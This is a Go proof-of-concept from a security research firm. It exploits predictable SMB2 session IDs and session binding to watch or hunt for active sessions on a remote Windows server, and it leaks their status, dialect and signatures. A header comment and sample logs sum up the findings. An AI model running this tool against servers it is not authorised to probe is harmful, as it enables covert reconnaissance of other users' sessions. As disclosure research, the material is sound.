package main

/*

Copyright (C) 2020 Critical Research Corporation

SMB2 Predictable Session ID Demonstration
=========================================

Uses predictable SMB2 Session IDs with Session Binding to monitor SMB sessions of a remote server.

This can leak the dialect and status of the guessed sessions.

On Windows the Signature field of the returned SESSION_SETUP response is signed with the
original remote session key. This seems bad, but doesn't appear to be exploitable, as the
input to this key includes a client and server challenge (among other fields), that are
not visible as a remote third-party.

On macOS (10.15) the smbd Session ID increments by 1, which leaks session activity, but SMB bind
requests fail and no information about the active sessions is obtained.

The predictable session IDs have been in place for years and seem to be a design choice.

On Linux-based Synology NAS devices, the session IDs are not predictable.

The session binding and signature calculation process is well-documented:
 - Handle of session binding requests: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/5ed93f06-a1d2-4837-8954-fa8b833c2654
 - Signature calculation: https://docs.microsoft.com/en-us/archive/blogs/openspecification/smb-2-and-smb-3-security-in-windows-10-the-anatomy-of-signing-and-cryptographic-keys

Usage:

$ go run main.go 192.168.0.220 watch

2020/03/28 16:16:31 192.168.0.220: determining the session cycle for map[ntlmssp.DNSComputer:WIN-EM7GG1U0LV3 ntlmssp.DNSDomain:WIN-EM7GG1U0LV3 ntlmssp.NTLMRevision:15 ntlmssp.NegotiationFlags:0xe28a8215 ntlmssp.NetbiosComputer:WIN-EM7GG1U0LV3 ntlmssp.NetbiosDomain:WIN-EM7GG1U0LV3 ntlmssp.TargetName:WIN-EM7GG1U0LV3 ntlmssp.Timestamp:0x01d6054627286627 ntlmssp.Version:10.0.14393 smb.Capabilities:0x0000002f smb.CipherAlg:aes-128-gcm 
smb.Dialect:0x0311 smb.GUID:6edc815a-7bea-cb41-a1dd-6079352c4fce smb.HashAlg:sha512 smb.HashSaltLen:32 smb.SessionID:0x00002c328000002d smb.Signing:enabled smb.Status:0xc0000016]

2020/03/28 16:16:48 192.168.0.220: cycle found after 205 requests: fffffffffffffffc-fffffffffffffff0-fffffffff800004c-7ffffcc-ffffffffcc000030-33ffffd4-fffffffffffffff0-18-14-fffffffffc00001c-fffffffff8000014-bffffc4-4-fffffffff8000028-ffffffffd000001c-37ffffb4-1c-fffffffffc000034-ffffffffc3ffffa8-40000030-c-fffffffff8000008-7fffffc-ffffffd6cfffffd4-2930000038-ffffffffebffffd0-14000034-3ffff8c-8-4-ffffffff5c000038-a3ffffd4        

2020/03/28 16:16:48 192.168.0.220: watching for new sessions...
2020/03/28 16:16:54 192.168.0.220: SESSION 0x00002c329c000011 is EXPIRED 
2020/03/28 16:16:59 192.168.0.220: SESSION 0x00002c329c000031 is ACTIVE dialect:0x0311 sig:526ec3d5a65947888677c43fee02604f
2020/03/28 16:17:03 192.168.0.220: SESSION 0x00002c329c000049 is EXPIRED 

*/

import (
	"encoding/binary"
	"fmt"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/hdm/rumble-tools/pkg/rnd"
)

func main() {
	usage := fmt.Sprintf("Usage: "+
		"\t%s <target> watch\n"+
		"\t%s <target> hunt\n",
		"\t%s <target> sample\n", os.Args[0], os.Args[0],os.Args[0],
	)

	if len(os.Args) < 3 {
		fmt.Fprintln(os.Stderr, usage)
		os.Exit(1)
	}

	dst := os.Args[1]
	mod := os.Args[2]
	switch mod {
	case "watch":
		doMonitor(dst)
	case "hunt":
		doHunt(dst)
	case "sample":
		doSample(dst)
	default:
		fmt.Fprintln(os.Stderr, usage)
	}
}

func doMonitor(dst string) {
	showInfo := false

	c := rnd.NewCounterPredictor(3, 10)
	for {
		info, err := probe(dst, "")
		if err != nil {
			log.Printf("%s: %s", dst, err)
			break
		}

		if info["smb.SessionID"] == "" {
			log.Printf("%s: no sid: %#v", dst, info)
			break
		}

		if !showInfo {
			log.Printf("%s: determining the session cycle for %v", dst, info)
			showInfo = true
		}

		newSID := decodeSessionID(info["smb.SessionID"])
		if !c.Ready() {

			if c.GetSampleCount() > 250 {
				log.Printf("%s: could not determine cycle after 250 requests", dst)
				return
			}

			if c.SubmitSample(newSID) {
				log.Printf("%s: cycle found after %d requests: %s", dst, c.GetSampleCount(), rnd.U64SliceToSeq(c.GetCycle()))
				log.Printf("%s: watching for new sessions...", dst)
			}

			continue
		}

		foundSessions, err := c.Check(newSID)
		if err != nil {
			log.Printf("%s: %s, recalibrating...", dst, err)
			c = rnd.NewCounterPredictor(3, 10)
			showInfo = false
			continue
		}

		for _, found := range foundSessions {
			res, _ := probe(dst, fmt.Sprintf("0x%.16x", found))
			sig := ""
			if res["smb.Signature"] != "" {
				sig = "sig:" + res["smb.Signature"]
			}

			status := res["smb.Status"]

			switch status {
			case "0xc0000203":
				status = "EXPIRED"
			case "0xc0000022":
				status = fmt.Sprintf("ACTIVE dialect:%s", res["smb.Dialect"])
			case "0xc000000d":
				status = fmt.Sprintf("ACTIVE dialect:!%s", res["smb.Dialect"])
			}

			log.Printf("%s: SESSION 0x%.16x is %s %s", dst, found, status, sig)
		}

		time.Sleep(time.Second)
	}
}

func doHunt(dst string) {
	log.Printf("%s: warning: hunt mode is unreliable and unlikely to find older sessions", dst)
	showInfo := false

	c := rnd.NewCounterPredictor(3, 10)

Predict:
	for {
		info, err := probe(dst, "")
		if err != nil {
			log.Printf("%s: %s", dst, err)
			break
		}

		if info["smb.SessionID"] == "" {
			log.Printf("%s: no sid: %#v", dst, info)
			break
		}

		if !showInfo {
			log.Printf("%s: determining the session cycle for %v", dst, info)
			showInfo = true
		}

		newSID := decodeSessionID(info["smb.SessionID"])
		if !c.Ready() {

			if c.GetSampleCount() > 250 {
				log.Printf("%s: could not determine cycle after 250 requests", dst)
				return
			}

			if c.SubmitSample(newSID) {
				log.Printf("%s: cycle found after %d requests: %s", dst, c.GetSampleCount(), rnd.U64SliceToSeq(c.GetCycle()))
				log.Printf("%s: hunting for existing sessions...", dst)
			}

			continue
		}

		sid := newSID

		cnt := 0
		for {

			if cnt > 10000 {
				log.Printf("%s: giving up...", dst)
				break Predict
			}

			sid, err = c.Previous(sid)
			if err != nil {
				log.Printf("%s: %s, exiting...", dst, err)
				break Predict
			}

			res, err := probe(dst, fmt.Sprintf("0x%.16x", sid))
			if err != nil {
				log.Printf("%s: %s, exiting...", dst, err)
				break Predict
			}
			cnt++

			if cnt%1000 == 0 {
				log.Printf("%s: sent %d requests (%x)", dst, cnt, sid)
			}

			sig := ""
			if res["smb.Signature"] != "" {
				sig = "sig:" + res["smb.Signature"]
			}

			status := res["smb.Status"]

			switch status {
			case "0xc0000203":
				continue
			case "0xc0000022":
				status = fmt.Sprintf("ACTIVE dialect:%s", res["smb.Dialect"])
			case "0xc000000d":
				status = fmt.Sprintf("ACTIVE dialect:!%s", res["smb.Dialect"])
			default:
				status = fmt.Sprintf("UNKNOWN %v", res)
			}

			log.Printf("%s: SESSION 0x%.16x is %s %s", dst, sid, status, sig)
		}
	}
}


func doSample(dst string) {
	showInfo := false

	for x:= 0; x <= 100; x++ {
		info, err := probe(dst, "")
		if err != nil {
			log.Printf("%s: %s", dst, err)
			break
		}

		if info["smb.SessionID"] == "" {
			log.Printf("%s: no sid: %#v", dst, info)
			break
		}
		 
		if ! showInfo {
			log.Printf("%s: sample 100 session IDs for %v", dst, info)
			showInfo = true
		}

		log.Printf("%s", info["smb.SessionID"])
	}
}

func probe(dip string, patchSID string) (map[string]string, error) {
	info := make(map[string]string)
	dst := dip + ":445"

	conn, err := net.DialTimeout("tcp", dst, rnd.SMBReadTimeout)
	if err != nil {
		return info, err
	}
	defer conn.Close()

	err = rnd.SMBSendData(conn, rnd.SMB1NegotiateProtocolRequest)
	if err != nil {
		return info, err
	}

	data, err := rnd.SMBReadFrame(conn, rnd.SMBReadTimeout)
	if err != nil {
		return info, err
	}

	err = rnd.SMBSendData(conn, rnd.SMB2NegotiateProtocolRequest(dip))
	if err != nil {
		return info, err
	}

	data, _ = rnd.SMBReadFrame(conn, rnd.SMBReadTimeout)
	rnd.SMB2ExtractFieldsFromNegotiateReply(data, info)

	setup := make([]byte, len(rnd.SMB2SessionSetupNTLMSSP))
	copy(setup, rnd.SMB2SessionSetupNTLMSSP)

	// Set the ProcessID
	binary.LittleEndian.PutUint16(setup[4+32:], 0xfeff)

	if patchSID != "" {
		// Set the SMB2_SESSION_FLAG_BINDING flag
		setup[4+66] = 1

		// Set the Signed PDU flag
		binary.LittleEndian.PutUint16(setup[4+16:], 0x08)

		// Set the SessionID
		sid := decodeSessionID(patchSID)
		binary.LittleEndian.PutUint64(setup[4+40:], sid)
	}

	err = rnd.SMBSendData(conn, setup)
	if err != nil {
		return info, err
	}

	data, err = rnd.SMBReadFrame(conn, rnd.SMBReadTimeout)
	rnd.SMB2ExtractSIDFromSessionSetupReply(data, info)
	rnd.SMBExtractFieldsFromSecurityBlob(data, info)

	return info, err
}

func decodeSessionID(sid string) uint64 {
	sid = strings.Replace(sid, "0x", "", -1)
	sidV, err := strconv.ParseUint(sid, 16, 64)
	if err != nil {
		return 0
	}
	return sidV
}
